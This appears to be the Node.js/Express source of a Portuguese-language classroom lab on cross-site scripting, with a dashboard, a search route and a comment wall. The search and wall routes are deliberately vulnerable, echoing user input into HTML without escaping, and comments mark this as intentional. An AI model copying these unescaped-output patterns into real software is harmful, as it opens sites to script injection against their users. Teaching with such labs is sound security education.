    .sidebar { width: 300px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
    .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
    .sidebar h2 { margin-top: 0; margin-bottom: 10px; color: #333; font-size: 16px; }
    .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
    .teste-item { margin: 8px 0; }
    .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
    .teste-link.active { background:#28a745; color:white; border:2px solid #1e7e34; }
    .teste-panel { display:none; background:#e9f7ef; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #28a745; }
    .teste-panel.open { display:block; }
    .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#fd7e14; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; text-decoration: none; }
    .nav-link { display:block; text-align:center; padding:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px; margin-top:10px; font-size: 13px; }
`;

const scriptAccordionXss = `
    let testeAbertoXss = null;
    function toggleTesteXss(id) {
        const painelNovo = document.getElementById('panel-' + id);
        const linkNovo = document.getElementById('link-' + id);
        const reabrindoMesmo = testeAbertoXss === id;

        if (testeAbertoXss) {
            document.getElementById('panel-' + testeAbertoXss).classList.remove('open');
            document.getElementById('link-' + testeAbertoXss).classList.remove('active');
        }

        if (reabrindoMesmo) {
            testeAbertoXss = null;
        } else {
            painelNovo.classList.add('open');
            linkNovo.classList.add('active');
            testeAbertoXss = id;
        }
    }

    async function resetarMural() {
        if (!confirm('⚠️ Isso vai restaurar o mural para os comentários originais, afetando TODOS os alunos conectados agora. Continuar?')) {
            return;
        }
        try {
            const response = await fetch('/xss/reset', { method: 'POST' });
            const resultado = await response.json();
            alert(resultado.mensagem || resultado.erro);
            window.location.reload();
        } catch (err) {
            alert('❌ Erro ao resetar: ' + err.message);
        }
    }
`;

// 1. DASHBOARD DO LAB DE XSS (menu lateral com os 10 testes + acesso às 2 rotas vulneráveis)
app.get('/xss', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório XSS - Dashboard</title>
            <style>${sidebarStyleXss}</style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h2>🧪 10 Testes XSS</h2>
                    <p>Clique em um teste para ver o payload (abre embaixo do item, fechando o anterior)</p>
                    ${renderMenuXss()}
                    <button class="reset-btn" onclick="resetarMural()">🔄 Resetar Mural do Laboratório</button>
                    <a href="/" class="nav-link">🏠 Voltar ao Hub</a>
                </div>

                <div class="main">
                    <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%); color: white; border-radius: 8px; margin-bottom: 30px;">
                        <h1 style="margin: 0; font-size: 28px;">🧪 Laboratório de Práticas</h1>
                        <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Cross-Site Scripting (XSS) - Aula Prática de Segurança</p>
                    </div>

                    <div style="background: #f0fff4; border-left: 4px solid #28a745; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                        <h3 style="color: #28a745; margin-top: 0;">📚 Como Usar:</h3>
                        <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                            <li>Escolha um payload no menu lateral (👈 são 10 testes diferentes)</li>
                            <li>Cole o payload na <strong>Busca de Produtos</strong> (XSS Refletido) ou no <strong>Mural de Recados</strong> (XSS Armazenado)</li>
                            <li>Observe o que acontece na tela (ou no Console do navegador, em alguns casos)</li>
                            <li>No mural, o payload fica salvo no banco e afeta todo mundo que visitar a página depois!</li>
                        </ol>
                    </div>

                    <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                        <a href="/xss/buscar" style="flex: 1; min-width: 240px; text-decoration: none; display: block; background: white; border: 2px solid #007bff; border-radius: 8px; padding: 25px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                            <div style="font-size: 36px;">🔍</div>
                            <h3 style="margin: 10px 0 5px 0; color: #007bff;">Busca de Produtos</h3>
                            <p style="color: #666; font-size: 13px;">XSS Refletido — o termo buscado aparece direto na resposta da página</p>
                        </a>
                        <a href="/xss/mural" style="flex: 1; min-width: 240px; text-decoration: none; display: block; background: white; border: 2px solid #28a745; border-radius: 8px; padding: 25px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                            <div style="font-size: 36px;">📝</div>
                            <h3 style="margin: 10px 0 5px 0; color: #28a745;">Mural de Recados</h3>
                            <p style="color: #666; font-size: 13px;">XSS Armazenado — o que você escrever fica salvo e é exibido para todos</p>
                        </a>
                    </div>
                </div>
            </div>
            <script>${scriptAccordionXss}</script>
        </body>
        </html>
    `);
});

// 2. ROTA DE BUSCA VULNERÁVEL A XSS REFLETIDO
//    O ERRO INTENCIONAL: o termo buscado volta na resposta sem nenhum escape de HTML
app.get('/xss/buscar', (req, res) => {
    const termo = req.query.termo || '';

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Busca de Produtos - Lab XSS</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            <h2>🔍 Busca de Produtos (XSS Refletido)</h2>
            <p style="color:#666;">O termo buscado é exibido na tela exatamente como foi digitado.</p>

            <form action="/xss/buscar" method="GET" style="margin-bottom: 20px; display: flex; gap: 10px;">
                <input type="text" name="termo" value="${termo}" style="flex: 1; padding:12px; border: 1px solid #ccc; border-radius:4px;" placeholder="Pesquisar produto... ou insira um payload XSS!">
                <button type="submit" style="padding:12px 25px; background:#007bff; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Buscar</button>
            </form>

            <div style="background:#f8f9fa; border: 1px solid #ddd; border-radius: 4px; padding: 20px;">
                <p style="color:#666; margin-top:0;">Resultado da busca para: <strong>${termo}</strong></p>
                <p style="color:#999;">Nenhum produto encontrado com esse termo.</p>
            </div>
            <br>
            <a href="/xss" style="color:#28a745; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `);
});

// 3. ROTA DO MURAL VULNERÁVEL A XSS ARMAZENADO (GET lista os comentários / POST salva um novo)
//    O ERRO INTENCIONAL: salva o texto puro no banco e renderiza o HTML/JS de volta sem escapar
app.get('/xss/mural', async (req, res) => {
    let comentariosHtml = '';
    try {
        const resultado = await pool.query('SELECT * FROM mural_comentarios ORDER BY id');
        resultado.rows.forEach(c => {
            comentariosHtml += `
                <div style="background:white; border:1px solid #ddd; border-radius:4px; padding:15px; margin-bottom:12px;">
                    <strong style="color:#28a745;">${c.autor}</strong>
                    <span style="color:#999; font-size:11px;"> — ${new Date(c.criado_em).toLocaleString('pt-BR')}</span>
                    <p style="margin-top:8px; color:#333;">${c.mensagem}</p>
                </div>
            `;
        });
    } catch (error) {
        comentariosHtml = `<p style="color:#d9534f;">❌ Erro ao carregar comentários: ${error.message}</p>`;
    }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Mural de Recados - Lab XSS</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            <h2>📝 Mural de Recados (XSS Armazenado)</h2>
            <p style="color:#666;">Tudo que for postado aqui é salvo no banco e exibido para todos os visitantes.</p>

            <form action="/xss/mural" method="POST" style="background:#f8f9fa; border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 25px;">
                <label style="font-weight:bold; display:block; margin-bottom:6px;">Seu nome:</label>
                <input type="text" name="autor" required style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;" placeholder="Ex: Aluno Teste">

                <label style="font-weight:bold; display:block; margin-bottom:6px;">Mensagem:</label>
                <textarea name="mensagem" required rows="3" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;" placeholder="Escreva uma mensagem... ou insira um payload XSS!"></textarea>

                <button type="submit" style="padding:12px 25px; background:#28a745; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Publicar</button>
            </form>

            <h3 style="color:#333;">Comentários:</h3>
            ${comentariosHtml || '<p style="color:#999;">Nenhum comentário ainda.</p>'}

            <br>
            <a href="/xss" style="color:#28a745; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `);
});

app.post('/xss/mural', async (req, res) => {
    const { autor, mensagem } = req.body;

    try {
        await pool.query('INSERT INTO mural_comentarios (autor, mensagem) VALUES ($1, $2)', [autor, mensagem]);
        res.redirect('/xss/mural');
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Erro ao salvar comentário!</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <br>
                <a href="/xss/mural" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// 4. ROTA PARA RESETAR O MURAL DO LABORATÓRIO (restaura comentários originais)
app.post('/xss/reset', async (req, res) => {
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM mural_comentarios');
        await client.query('ALTER SEQUENCE mural_comentarios_id_seq RESTART WITH 1');
        for (const c of SEED_COMENTARIOS) {
            await client.query('INSERT INTO mural_comentarios (autor, mensagem) VALUES ($1, $2)', [c.autor, c.mensagem]);
        }

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: '✅ Mural resetado com sucesso! Comentários voltaram ao estado original.' });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// Inicialização da porta dinâmica (Render ou Local)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🔥 Servidor do Laboratório iniciado com sucesso na porta ${PORT}`));
